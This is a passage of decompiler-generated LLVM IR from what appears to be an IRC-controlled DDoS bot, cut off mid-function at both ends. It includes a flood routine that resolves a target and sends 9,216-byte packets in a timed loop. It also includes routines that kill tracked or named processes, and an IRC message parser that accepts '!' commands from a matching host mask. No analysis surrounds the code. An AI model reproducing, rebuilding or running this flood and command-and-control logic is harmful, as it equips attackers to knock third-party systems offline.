  %v2_8db8 = ptrtoint i32* %stack_var_-48 to i32
  %v1_8dc0 = add i32 %v1_8d88, 12
  %v2_8dc0 = inttoptr i32 %v1_8dc0 to i32*
  %v3_8dc0 = load i32, i32* %v2_8dc0, align 4
  store i32 %v3_8dc0, i32* @r2, align 4
  %v3_8dd0 = call i32 @bcopy(i32 %v2_8db0, i32 %v2_8db8, i32 %v3_8dc0)
  %v1_8dd8 = add i32 %v1_8d88, 8
  %v2_8dd8 = inttoptr i32 %v1_8dd8 to i32*
  %v3_8dd8 = load i32, i32* %v2_8dd8, align 4
  %v3_8de0 = urem i32 %v3_8dd8, 65536
  store i32 %v3_8de0, i32* %stack_var_-52, align 4
  %v3_8df0 = load i32, i32* %stack_var_-68, align 4
  %v1_8df4 = add i32 %v3_8df0, 8
  %v1_8df8 = inttoptr i32 %v1_8df4 to i32*
  %v2_8df8 = load i32, i32* %v1_8df8, align 4
  store i32 %v2_8df8, i32* @r0, align 4
  %v1_8e00 = call i32 @atol(i32 %v2_8df8)
  %v3_8e54 = bitcast i32* %stack_var_-52 to %sockaddr*
  %v2_8e70 = add i32 %v1_8d58, %v2_8d3c
  br label %dec_label_pc_8e24

dec_label_pc_8e24:                                ; preds = %dec_label_pc_8e94, %dec_label_pc_8d78
  %storemerge3 = phi i32 [ 0, %dec_label_pc_8d78 ], [ %v1_8e98, %dec_label_pc_8e94 ]
  %tmp = icmp ult i32 %storemerge3, 50
  br i1 %tmp, label %dec_label_pc_8e94, label %dec_label_pc_8e30

dec_label_pc_8e30:                                ; preds = %dec_label_pc_8e24
  %v6_8e40 = call i32 @__libc_send(i32 %v0_8d2c, i32* bitcast ([4 x i8]* @global_var_13eb4.299 to i32*), i32 50, i32 0)
  %v4_8e54 = call i32 @__libc_connect(i32 %v0_8d2c, %sockaddr* %v3_8e54, i32 16)
  %v2_8e5c = call i32 @__GI_time(i32* null)
  %v3_8e74 = icmp ult i32 %v2_8e5c, %v2_8e70
  br i1 %v3_8e74, label %dec_label_pc_8e8c, label %dec_label_pc_8e7c

dec_label_pc_8e7c:                                ; preds = %dec_label_pc_8e30
  %v1_8e80 = call i32 @__libc_close(i32 %v0_8d2c)
  %v1_8e88 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8e8c

dec_label_pc_8e8c:                                ; preds = %dec_label_pc_8e30, %dec_label_pc_8e7c
  br label %dec_label_pc_8e94

dec_label_pc_8e94:                                ; preds = %dec_label_pc_8e24, %dec_label_pc_8e8c
  %stack_var_-20.0 = phi i32 [ %storemerge3, %dec_label_pc_8e24 ], [ 0, %dec_label_pc_8e8c ]
  %v1_8e98 = add i32 %stack_var_-20.0, 1
  br label %dec_label_pc_8e24

dec_label_pc_8ea4:                                ; preds = %dec_label_pc_8d20
  ret i32 %v1_8d68

; uselistorder directives
  uselistorder i32 %storemerge3, { 1, 0 }
  uselistorder i32 %v3_8dc0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8e94, { 1, 0 }
  uselistorder label %dec_label_pc_8e8c, { 1, 0 }
  uselistorder label %dec_label_pc_8d20, { 1, 0 }
}

define i32 @stop(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 36540, i32* %stack_var_-4, align 4
  %v2_8eb8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8eb8, i32* @fp, align 4
  %v0_8ec0 = load i32, i32* %r0.global-to-local, align 4
  %v2_8f30 = icmp eq i32 %arg2, 0
  %v2_8fa414 = load i32, i32* @global_var_1e7fc.287, align 4
  %v3_8fac16 = icmp eq i32 %v2_8fa414, 0
  br i1 %v3_8fac16, label %dec_label_pc_8fb4, label %dec_label_pc_8edc

dec_label_pc_8edc:                                ; preds = %dec_label_pc_8f94, %entry
  %storemerge122 = phi i32 [ %v1_8f98, %dec_label_pc_8f94 ], [ 0, %entry ]
  %v12_8fb821 = phi i32 [ %v12_8fb82, %dec_label_pc_8f94 ], [ %v0_8ec0, %entry ]
  %v3_8ee0 = mul i32 %storemerge122, 4
  %v2_8eec = load i32, i32* @global_var_20e74.289, align 4
  %v2_8ef0 = add i32 %v2_8eec, %v3_8ee0
  %v1_8ef4 = inttoptr i32 %v2_8ef0 to i32*
  %v2_8ef4 = load i32, i32* %v1_8ef4, align 4
  %v2_8ef8 = icmp eq i32 %v2_8ef4, 0
  br i1 %v2_8ef8, label %dec_label_pc_8f94, label %dec_label_pc_8f00

dec_label_pc_8f00:                                ; preds = %dec_label_pc_8edc
  %v2_8f18 = load i32, i32* %v1_8ef4, align 4
  store i32 %v2_8f18, i32* @r4, align 4
  %v0_8f1c = call i32 @__libc_getpid()
  store i32 %v0_8f1c, i32* %r0.global-to-local, align 4
  %v0_8f24 = load i32, i32* @r4, align 4
  %v9_8f24 = icmp eq i32 %v0_8f24, %v0_8f1c
  br i1 %v9_8f24, label %dec_label_pc_8f94, label %dec_label_pc_8f2c

dec_label_pc_8f2c:                                ; preds = %dec_label_pc_8f00
  br i1 %v2_8f30, label %dec_label_pc_8f6c, label %dec_label_pc_8f38

dec_label_pc_8f38:                                ; preds = %dec_label_pc_8f2c
  %v2_8f3c = load i32, i32* @global_var_20e70.302, align 4
  store i32 %v0_8ec0, i32* %r0.global-to-local, align 4
  %v4_8f68 = call i32 @Send(i32 %v0_8ec0, i32 ptrtoint ([29 x i8]* @global_var_13eb8.304 to i32), i32 %v2_8f3c)
  store i32 %v4_8f68, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8f6c

dec_label_pc_8f6c:                                ; preds = %dec_label_pc_8f2c, %dec_label_pc_8f38
  %v2_8f7c = load i32, i32* @global_var_20e74.289, align 4
  %v2_8f80 = add i32 %v2_8f7c, %v3_8ee0
  %v1_8f84 = inttoptr i32 %v2_8f80 to i32*
  %v2_8f84 = load i32, i32* %v1_8f84, align 4
  store i32 %v2_8f84, i32* %r0.global-to-local, align 4
  %v0_8f90 = call i32 @kill()
  store i32 %v0_8f90, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8f94

dec_label_pc_8f94:                                ; preds = %dec_label_pc_8f00, %dec_label_pc_8edc, %dec_label_pc_8f6c
  %v12_8fb82 = phi i32 [ %v0_8f1c, %dec_label_pc_8f00 ], [ %v12_8fb821, %dec_label_pc_8edc ], [ %v0_8f90, %dec_label_pc_8f6c ]
  %v1_8f98 = add i32 %storemerge122, 1
  %v2_8fa4 = load i32, i32* @global_var_1e7fc.287, align 4
  %v3_8fac = icmp ult i32 %v1_8f98, %v2_8fa4
  br i1 %v3_8fac, label %dec_label_pc_8edc, label %dec_label_pc_8fb4

dec_label_pc_8fb4:                                ; preds = %dec_label_pc_8f94, %entry
  %v12_8fb8.lcssa = phi i32 [ %v0_8ec0, %entry ], [ %v12_8fb82, %dec_label_pc_8f94 ]
  ret i32 %v12_8fb8.lcssa

; uselistorder directives
  uselistorder i32 %v1_8f98, { 1, 0 }
  uselistorder i32 %v3_8ee0, { 1, 0 }
  uselistorder i32 %storemerge122, { 1, 0 }
  uselistorder i32 %v0_8ec0, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 5, 4, 6, 0, 1 }
  uselistorder label %dec_label_pc_8f94, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8f6c, { 1, 0 }
}

define i32 @unknown(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 36824, i32* %stack_var_-4, align 4
  %v2_8fd4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8fd4, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  %v1_8ff8 = call i32 @malloc(i32 9216)
  %v2_9008 = call i32 @__GI_time(i32* null)
  %v1_9018 = call i32 @mfork(i32 %arg2)
  %v2_9020 = icmp eq i32 %v1_9018, 0
  br i1 %v2_9020, label %dec_label_pc_9028, label %dec_label_pc_91bc

dec_label_pc_9028:                                ; preds = %entry
  %v7_902c = icmp eq i32 %arg3, 2
  br i1 %v7_902c, label %dec_label_pc_903c, label %dec_label_pc_9034

dec_label_pc_9034:                                ; preds = %dec_label_pc_9028
  %v1_9038 = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_903c

dec_label_pc_903c:                                ; preds = %dec_label_pc_9028, %dec_label_pc_9034
  %v1_9040 = add i32 %arg4, 8
  %v1_9044 = inttoptr i32 %v1_9040 to i32*
  %v2_9044 = load i32, i32* %v1_9044, align 4
  store i32 %v2_9044, i32* @r0, align 4
  %v1_904c = call i32 @atol(i32 %v2_9044)
  %v2_9058 = ptrtoint i32* %stack_var_-60 to i32
  store i32 0, i32* %stack_var_-60, align 4
  %v1_908c = add i32 %arg4, 4
  %v1_9090 = inttoptr i32 %v1_908c to i32*
  %v2_9090 = load i32, i32* %v1_9090, align 4
  %v3_909c = call i32 @host2ip(i32 %arg2, i32 %v2_9090, i32 0)
  store i32 2, i32* %stack_var_-60, align 4
  %v2_90bc = load i32, i32* @global_var_20e70.302, align 4
  %v4_90d4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_13ed8.308 to i32), i32 %v2_90bc)
  %v2_9188 = add i32 %v1_904c, %v2_9008
  %v2_9120 = ptrtoint i32* %stack_var_-44 to i32
  %v6_9158 = inttoptr i32 %v1_8ff8 to i32*
  br label %dec_label_pc_90d8

dec_label_pc_90d8:                                ; preds = %dec_label_pc_919c, %dec_label_pc_903c
  %stack_var_-36.0 = phi i32 [ %tmp, %dec_label_pc_903c ], [ %v1_91a0, %dec_label_pc_919c ]
  %v0_90d8 = call i32 @random()
  %v0_9100 = call i32 @socket()
  %v1_9110 = icmp slt i32 %v0_9100, 0
  br i1 %v1_9110, label %dec_label_pc_9164, label %dec_label_pc_9118

dec_label_pc_9118:                                ; preds = %dec_label_pc_90d8
  store i32 1, i32* %stack_var_-44, align 4
  %v3_9134 = call i32 @ioctl(i32 %v0_9100, i32 21537, i32 %v2_9120)
  %v7_9158 = call i32 @__libc_sendto(i32 %v0_9100, i32* %v6_9158, i32 9216, i32 0, i32 %v2_9058, i32 16)
  %v1_9160 = call i32 @__libc_close(i32 %v0_9100)
  br label %dec_label_pc_9164

dec_label_pc_9164:                                ; preds = %dec_label_pc_90d8, %dec_label_pc_9118
  %v7_916c = icmp slt i32 %stack_var_-36.0, 50
  br i1 %v7_916c, label %dec_label_pc_919c, label %dec_label_pc_9170

dec_label_pc_9170:                                ; preds = %dec_label_pc_9164
  %v2_9174 = call i32 @__GI_time(i32* null)
  %v3_918c = icmp ult i32 %v2_9174, %v2_9188
  br i1 %v3_918c, label %dec_label_pc_9194, label %dec_label_pc_91ac

dec_label_pc_9194:                                ; preds = %dec_label_pc_9170
  br label %dec_label_pc_919c

dec_label_pc_919c:                                ; preds = %dec_label_pc_9164, %dec_label_pc_9194
  %stack_var_-36.1 = phi i32 [ %stack_var_-36.0, %dec_label_pc_9164 ], [ 0, %dec_label_pc_9194 ]
  %v1_91a0 = add i32 %stack_var_-36.1, 1
  br label %dec_label_pc_90d8

dec_label_pc_91ac:                                ; preds = %dec_label_pc_9170
  %v1_91b0 = call i32 @__libc_close(i32 %v0_9100)
  %v1_91b8 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_91bc

dec_label_pc_91bc:                                ; preds = %entry, %dec_label_pc_91ac
  %v9_91c0 = phi i32 [ %v1_9018, %entry ], [ %v1_91b8, %dec_label_pc_91ac ]
  ret i32 %v9_91c0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 0, 2, 1 }
  uselistorder i32 50, { 1, 2, 0, 3 }
  uselistorder i32 (i32)* @atol, { 2, 1, 0 }
  uselistorder i32 (i32)* @mfork, { 1, 0 }
  uselistorder label %dec_label_pc_91bc, { 1, 0 }
  uselistorder label %dec_label_pc_919c, { 1, 0 }
  uselistorder label %dec_label_pc_9164, { 1, 0 }
  uselistorder label %dec_label_pc_903c, { 1, 0 }
}

define i32 @killsec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_91f0 = load i32, i32* bitcast ([2 x i8*]* @global_var_1e408.312 to i32*), align 4
  %tmp10 = inttoptr i32 %v2_91f0 to i8*
  %v4_91fc = call i32 @__GI_strcasecmp(i8* %tmp10, i32 %arg2)
  %v2_9204 = icmp eq i32 %v4_91fc, 0
  br i1 %v2_9204, label %dec_label_pc_920c, label %dec_label_pc_9218

dec_label_pc_920c:                                ; preds = %entry
  %v0_9214 = call i32 @kill()
  br label %dec_label_pc_9218

dec_label_pc_9218:                                ; preds = %entry, %dec_label_pc_920c
  %v9_921c = phi i32 [ %v4_91fc, %entry ], [ %v0_9214, %dec_label_pc_920c ]
  ret i32 %v9_921c

; uselistorder directives
  uselistorder label %dec_label_pc_9218, { 1, 0 }
}

define i32 @_PRIVMSG(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to i8*
  %tmp32 = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-1112 = alloca i32, align 4
  %stack_var_-1124 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_9228 = load i32, i32* @r4, align 4
  store i32 %v3_9228, i32* %stack_var_-20, align 4
  store i32 37424, i32* %stack_var_-4, align 4
  %v16_9228 = ptrtoint i32* %stack_var_-20 to i32
  %v2_922c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_922c, i32* @fp, align 4
  store i8* %tmp, i8** %stack_var_-1124, align 4
  br label %dec_label_pc_9258

dec_label_pc_924c:                                ; preds = %dec_label_pc_9270
  %v1_9250 = add i32 %storemerge11, 1
  br label %dec_label_pc_9258

dec_label_pc_9258:                                ; preds = %entry, %dec_label_pc_924c
  %v3_925c = phi i8* [ %tmp, %entry ], [ %v3_9278, %dec_label_pc_924c ]
  %storemerge11 = phi i32 [ 0, %entry ], [ %v1_9250, %dec_label_pc_924c ]
  %v4_925c = ptrtoint i8* %v3_925c to i32
  store i32 %v4_925c, i32* %r0.global-to-local, align 4
  %v3_9260 = call i32 @strlen(i8* %v3_925c)
  store i32 %v3_9260, i32* %r0.global-to-local, align 4
  %v3_9268 = icmp ult i32 %storemerge11, %v3_9260
  br i1 %v3_9268, label %dec_label_pc_9270, label %dec_label_pc_9258.dec_label_pc_928c_crit_edge

dec_label_pc_9258.dec_label_pc_928c_crit_edge:    ; preds = %dec_label_pc_9258
  %v3_9294.pre = load i8*, i8** %stack_var_-1124, align 4
  br label %dec_label_pc_928c

dec_label_pc_9270:                                ; preds = %dec_label_pc_9258
  %v3_9278 = load i8*, i8** %stack_var_-1124, align 4
  %v4_9278 = ptrtoint i8* %v3_9278 to i32
  %v2_927c = add i32 %v4_9278, %storemerge11
  %v1_9280 = inttoptr i32 %v2_927c to i8*
  %v2_9280 = load i8, i8* %v1_9280, align 1
  %v7_9284 = icmp eq i8 %v2_9280, 32
  br i1 %v7_9284, label %dec_label_pc_928c, label %dec_label_pc_924c

dec_label_pc_928c:                                ; preds = %dec_label_pc_9270, %dec_label_pc_9258.dec_label_pc_928c_crit_edge
  %v3_9294 = phi i8* [ %v3_9294.pre, %dec_label_pc_9258.dec_label_pc_928c_crit_edge ], [ %v3_9278, %dec_label_pc_9270 ]
  %v4_9294 = ptrtoint i8* %v3_9294 to i32
  %v2_9298 = add i32 %v4_9294, %storemerge11
  %v3_92a0 = inttoptr i32 %v2_9298 to i8*
  store i8 0, i8* %v3_92a0, align 1
  %v3_92a4 = load i8*, i8** %stack_var_-1124, align 4
  %v4_92b4 = ptrtoint i8* %v3_92a4 to i32
  %v2_92b8 = add i32 %v4_92b4, %storemerge11
  %v1_92bc = add i32 %v2_92b8, 2
  %v5_92c0 = inttoptr i32 %v1_92bc to i8*
  br label %dec_label_pc_92dc

dec_label_pc_92d0:                                ; preds = %dec_label_pc_92f4
  %v1_92d4 = add i32 %storemerge12, 1
  br label %dec_label_pc_92dc

dec_label_pc_92dc:                                ; preds = %dec_label_pc_928c, %dec_label_pc_92d0
  %storemerge12 = phi i32 [ 0, %dec_label_pc_928c ], [ %v1_92d4, %dec_label_pc_92d0 ]
  store i32 %storemerge12, i32* @r4, align 4
  store i32 %tmp32, i32* %r0.global-to-local, align 4
  %v3_92e4 = call i32 @strlen(i8* %arg2)
  store i32 %v3_92e4, i32* %r0.global-to-local, align 4
  %v0_92ec = load i32, i32* @r4, align 4
  %v3_92ec = icmp ult i32 %v0_92ec, %v3_92e4
  br i1 %v3_92ec, label %dec_label_pc_92f4, label %dec_label_pc_92dc.dec_label_pc_9310_crit_edge

dec_label_pc_92dc.dec_label_pc_9310_crit_edge:    ; preds = %dec_label_pc_92dc
  %.pre = add i32 %storemerge12, %tmp32
  %.pre26 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_9310

dec_label_pc_92f4:                                ; preds = %dec_label_pc_92dc
  %v2_9300 = add i32 %storemerge12, %tmp32
  %v1_9304 = inttoptr i32 %v2_9300 to i8*
  %v2_9304 = load i8, i8* %v1_9304, align 1
  %v7_9308 = icmp eq i8 %v2_9304, 33
  br i1 %v7_9308, label %dec_label_pc_9310, label %dec_label_pc_92d0

dec_label_pc_9310:                                ; preds = %dec_label_pc_92f4, %dec_label_pc_92dc.dec_label_pc_9310_crit_edge
  %v3_9324.pre-phi = phi i8* [ %.pre26, %dec_label_pc_92dc.dec_label_pc_9310_crit_edge ], [ %v1_9304, %dec_label_pc_92f4 ]
  store i8 0, i8* %v3_9324.pre-phi, align 1
  %v2_932c = load i8, i8* %v5_92c0, align 1
  %v7_9330 = icmp eq i8 %v2_932c, 33
  br i1 %v7_9330, label %dec_label_pc_9338, label %dec_label_pc_976c

dec_label_pc_9338:                                ; preds = %dec_label_pc_9310
  %v2_933c = load i32, i32* @global_var_20e70.302, align 4
  store i32 %v4_92b4, i32* %r0.global-to-local, align 4
  %v4_9348 = call i32 @__GI_strcasecmp(i8* %v3_92a4, i32 %v2_933c)
  store i32 %v4_9348, i32* %r0.global-to-local, align 4
  %v2_9350 = icmp eq i32 %v4_9348, 0
  br i1 %v2_9350, label %dec_label_pc_9358, label %dec_label_pc_976c

dec_label_pc_9358:                                ; preds = %dec_label_pc_9338
  %v2_935c = ptrtoint i32* %stack_var_-1112 to i32
  store i32 1024, i32* @r2, align 4
  store i32 %v2_935c, i32* %r0.global-to-local, align 4
  %v2_936c = bitcast i32* %stack_var_-1112 to i8*
  %v3_936c = call i32 @__GI_memset(i8* %v2_936c, i32 0)
  store i32 %v3_936c, i32* %r0.global-to-local, align 4
  %v1_937c = add i32 %v2_92b8, 3
  %v5_9380 = inttoptr i32 %v1_937c to i8*
  br label %dec_label_pc_939c

dec_label_pc_9390:                                ; preds = %dec_label_pc_93b4
  %v1_9394 = add i32 %storemerge13, 1
  br label %dec_label_pc_939c

dec_label_pc_939c:                                ; preds = %dec_label_pc_9358, %dec_label_pc_9390
  %storemerge13 = phi i32 [ 0, %dec_label_pc_9358 ], [ %v1_9394, %dec_label_pc_9390 ]
  store i32 %storemerge13, i32* @r4, align 4
  store i32 %v1_937c, i32* %r0.global-to-local, align 4
  %v3_93a4 = call i32 @strlen(i8* %v5_9380)
  store i32 %v3_93a4, i32* %r0.global-to-local, align 4
  %v0_93ac = load i32, i32* @r4, align 4
  %v3_93ac = icmp ult i32 %v0_93ac, %v3_93a4
  br i1 %v3_93ac, label %dec_label_pc_93b4, label %dec_label_pc_939c.dec_label_pc_93d0_crit_edge

dec_label_pc_939c.dec_label_pc_93d0_crit_edge:    ; preds = %dec_label_pc_939c
  %.pre27 = add i32 %storemerge13, %v1_937c
  %.pre28 = inttoptr i32 %.pre27 to i8*
  br label %dec_label_pc_93d0

dec_label_pc_93b4:                                ; preds = %dec_label_pc_939c
  %v2_93c0 = add i32 %storemerge13, %v1_937c
  %v1_93c4 = inttoptr i32 %v2_93c0 to i8*
  %v2_93c4 = load i8, i8* %v1_93c4, align 1
  %v7_93c8 = icmp eq i8 %v2_93c4, 32
  br i1 %v7_93c8, label %dec_label_pc_93d0, label %dec_label_pc_9390

dec_label_pc_93d0:                                ; preds = %dec_label_pc_93b4, %dec_label_pc_939c.dec_label_pc_93d0_crit_edge
  %v3_93e4.pre-phi = phi i8* [ %.pre28, %dec_label_pc_939c.dec_label_pc_93d0_crit_edge ], [ %v1_93c4, %dec_label_pc_93b4 ]
  %v2_93dc.pre-phi = phi i32 [ %.pre27, %dec_label_pc_939c.dec_label_pc_93d0_crit_edge ], [ %v2_93c0, %dec_label_pc_93b4 ]
  store i8 0, i8* %v3_93e4.pre-phi, align 1
  %v2_93f0 = load i32, i32* @global_var_20e58.315, align 4
  store i32 %v1_937c, i32* %r0.global-to-local, align 4
  %v3_93fc = call i32 @strwildmatch(i8* %v5_9380, i32 %v2_93f0)
  store i32 %v3_93fc, i32* %r0.global-to-local, align 4
  %v2_9404 = icmp eq i32 %v3_93fc, 0
  br i1 %v2_9404, label %dec_label_pc_940c, label %dec_label_pc_976c

dec_label_pc_940c:                                ; preds = %dec_label_pc_93d0
  %v1_9418 = add i32 %v2_93dc.pre-phi, 1
  %v5_941c = inttoptr i32 %v1_9418 to i8*
  store i32 %v1_9418, i32* %r0.global-to-local, align 4
  %v3_9424 = call i32 @strlen(i8* %v5_941c)
  store i32 %v3_9424, i32* %r0.global-to-local, align 4
  %v2_9474 = add i32 %v16_9228, -1092
  br label %dec_label_pc_949c

dec_label_pc_943c:                                ; preds = %dec_label_pc_949c
  %v2_9440 = load i8, i8* %stack_var_-32.0, align 1
  %v7_9444 = icmp eq i8 %v2_9440, 32
  br i1 %v7_9444, label %dec_label_pc_94ec, label %dec_label_pc_944c

dec_label_pc_944c:                                ; preds = %dec_label_pc_943c
  %v2_9450 = load i8, i8* %stack_var_-32.0, align 1
  %v2_9454 = icmp eq i8 %v2_9450, 0
  br i1 %v2_9454, label %dec_label_pc_94ec, label %dec_label_pc_945c

dec_label_pc_945c:                                ; preds = %dec_label_pc_944c
  %v2_9464 = load i8, i8* %stack_var_-32.0, align 1
  store i32 %v16_9228, i32* %r0.global-to-local, align 4
  %v2_9478 = add i32 %v2_9474, %storemerge14
  %v3_9480 = inttoptr i32 %v2_9478 to i8*
  store i8 %v2_9464, i8* %v3_9480, align 1
  %v1_9488 = add i32 %v4_943c, 1
  %v5_948c = inttoptr i32 %v1_9488 to i8*
  %v1_9494 = add nuw i32 %storemerge14, 1
  br label %dec_label_pc_949c

dec_label_pc_949c:                                ; preds = %dec_label_pc_940c, %dec_label_pc_945c
  %stack_var_-32.0 = phi i8* [ %v5_941c, %dec_label_pc_940c ], [ %v5_948c, %dec_label_pc_945c ]
  %storemerge14 = phi i32 [ 0, %dec_label_pc_940c ], [ %v1_9494, %dec_label_pc_945c ]
  %v5_94a8 = icmp slt i32 %storemerge14, %v3_9424
  %v4_943c = ptrtoint i8* %stack_var_-32.0 to i32
  br i1 %v5_94a8, label %dec_label_pc_943c, label %dec_label_pc_94ec

dec_label_pc_94b8:                                ; preds = %dec_label_pc_94ec
  %v2_94c4 = add i32 %storemerge15, %v4_943c
  %v1_94c8 = inttoptr i32 %v2_94c4 to i8*
  %v2_94c8 = load i8, i8* %v1_94c8, align 1
  %v7_94cc = icmp eq i8 %v2_94c8, 32
  br i1 %v7_94cc, label %dec_label_pc_94d4, label %dec_label_pc_94e0

dec_label_pc_94d4:                                ; preds = %dec_label_pc_94b8
  %v1_94d8 = add i32 %stack_var_-28.1, 1
  br label %dec_label_pc_94e0

dec_label_pc_94e0:                                ; preds = %dec_label_pc_94b8, %dec_label_pc_94d4
  %stack_var_-28.0 = phi i32 [ %v1_94d8, %dec_label_pc_94d4 ], [ %stack_var_-28.1, %dec_label_pc_94b8 ]
  %v1_94e4 = add i32 %storemerge15, 1
  br label %dec_label_pc_94ec

dec_label_pc_94ec:                                ; preds = %dec_label_pc_943c, %dec_label_pc_944c, %dec_label_pc_949c, %dec_label_pc_94e0
  %stack_var_-28.1 = phi i32 [ %stack_var_-28.0, %dec_label_pc_94e0 ], [ 0, %dec_label_pc_949c ], [ 0, %dec_label_pc_944c ], [ 0, %dec_label_pc_943c ]
  %storemerge15 = phi i32 [ %v1_94e4, %dec_label_pc_94e0 ], [ 0, %dec_label_pc_949c ], [ 0, %dec_label_pc_944c ], [ 0, %dec_label_pc_943c ]
  store i32 %storemerge15, i32* @r4, align 4
  store i32 %v4_943c, i32* %r0.global-to-local, align 4
  %v3_94f4 = call i32 @strlen(i8* %stack_var_-32.0)
  store i32 %v3_94f4, i32* %r0.global-to-local, align 4
  %v0_94fc = load i32, i32* @r4, align 4
  %v3_94fc = icmp ult i32 %v0_94fc, %v3_94f4
  br i1 %v3_94fc, label %dec_label_pc_94b8, label %dec_label_pc_9504

dec_label_pc_9504:                                ; preds = %dec_label_pc_94ec
  %v1_9508 = add i32 %stack_var_-28.1, 1
  %v7_9518 = icmp slt i32 %v1_9508, 11
  br i1 %v7_9518, label %dec_label_pc_9524, label %dec_label_pc_951c

dec_label_pc_951c:                                ; preds = %dec_label_pc_9504
  br label %dec_label_pc_9524

dec_label_pc_9524:                                ; preds = %dec_label_pc_9504, %dec_label_pc_951c
  %stack_var_-28.2 = phi i32 [ %v1_9508, %dec_label_pc_9504 ], [ 10, %dec_label_pc_951c ]
  %tmp74 = mul i32 %stack_var_-28.2, 4
  %v3_953c = add i32 %tmp74, 4
  %v2_9544 = add i32 %v16_9228, -68
  %v2_9548 = add i32 %v2_9544, %v3_953c
  %v2_9550 = inttoptr i32 %v2_9548 to i32*
  store i32 ptrtoint (i32* @global_var_13f3c.317 to i32), i32* %v2_9550, align 4
  %v2_967819 = load i8, i8* %stack_var_-32.0, align 1
  %v2_967c21 = icmp eq i8 %v2_967819, 0
  br i1 %v2_967c21, label %dec_label_pc_9684, label %dec_label_pc_9560

dec_label_pc_9560:                                ; preds = %dec_label_pc_9524, %dec_label_pc_95c8
  %v4_967423 = phi i32 [ %v2_966c.pre-phi, %dec_label_pc_95c8 ], [ %v4_943c, %dec_label_pc_9524 ]
  %stack_var_-24.022 = phi i32 [ %v1_9658, %dec_label_pc_95c8 ], [ 1, %dec_label_pc_9524 ]
  %v1_9564 = add i32 %v4_967423, 1
  %v5_9568 = inttoptr i32 %v1_9564 to i8*
  %v6_9578 = icmp slt i32 %stack_var_-24.022, %stack_var_-28.2
  br i1 %v6_9578, label %dec_label_pc_9594, label %dec_label_pc_9684

dec_label_pc_9588:                                ; preds = %dec_label_pc_95ac
  %v1_958c = add i32 %storemerge17, 1
  br label %dec_label_pc_9594

dec_label_pc_9594:                                ; preds = %dec_label_pc_9560, %dec_label_pc_9588
  %storemerge17 = phi i32 [ %v1_958c, %dec_label_pc_9588 ], [ 0, %dec_label_pc_9560 ]
  store i32 %v1_9564, i32* %r0.global-to-local, align 4
  %v3_959c = call i32 @strlen(i8* %v5_9568)
  store i32 %v3_959c, i32* %r0.global-to-local, align 4
  %v3_95a4 = icmp ult i32 %storemerge17, %v3_959c
  br i1 %v3_95a4, label %dec_label_pc_95ac, label %dec_label_pc_9594.dec_label_pc_95c8_crit_edge

dec_label_pc_9594.dec_label_pc_95c8_crit_edge:    ; preds = %dec_label_pc_9594
  %.pre30 = add i32 %storemerge17, %v1_9564
  %.pre31 = inttoptr i32 %.pre30 to i8*
  br label %dec_label_pc_95c8

dec_label_pc_95ac:                                ; preds = %dec_label_pc_9594
  %v2_95b8 = add i32 %storemerge17, %v1_9564
  %v1_95bc = inttoptr i32 %v2_95b8 to i8*
  %v2_95bc = load i8, i8* %v1_95bc, align 1
  %v7_95c0 = icmp eq i8 %v2_95bc, 32
  br i1 %v7_95c0, label %dec_label_pc_95c8, label %dec_label_pc_9588

dec_label_pc_95c8:                                ; preds = %dec_label_pc_95ac, %dec_label_pc_9594.dec_label_pc_95c8_crit_edge
  %v5_9670.pre-phi = phi i8* [ %.pre31, %dec_label_pc_9594.dec_label_pc_95c8_crit_edge ], [ %v1_95bc, %dec_label_pc_95ac ]
  %v2_966c.pre-phi = phi i32 [ %.pre30, %dec_label_pc_9594.dec_label_pc_95c8_crit_edge ], [ %v2_95b8, %dec_label_pc_95ac ]
  store i32 %stack_var_-24.022, i32* @r4, align 4
  %v1_95d0 = add i32 %storemerge17, 1
  store i32 %v1_95d0, i32* %r0.global-to-local, align 4
  %v1_95d8 = call i32 @malloc(i32 %v1_95d0)
  %v0_95e8 = load i32, i32* @r4, align 4
  %v3_95e8 = mul i32 %v0_95e8, 4
  store i32 %v16_9228, i32* %r0.global-to-local, align 4
  %v2_95f4 = add i32 %v2_9544, %v3_95e8
  %v2_95f8 = inttoptr i32 %v2_95f4 to i32*
  store i32 %v1_95d8, i32* %v2_95f8, align 4
  %v3_9604 = mul i32 %stack_var_-24.022, 4
  %v2_9610 = add i32 %v2_9544, %v3_9604
  %v1_9614 = inttoptr i32 %v2_9610 to i32*
  %v2_9614 = load i32, i32* %v1_9614, align 4
  store i32 %v2_9614, i32* %r0.global-to-local, align 4
  store i32 %v1_9564, i32* @r1, align 4
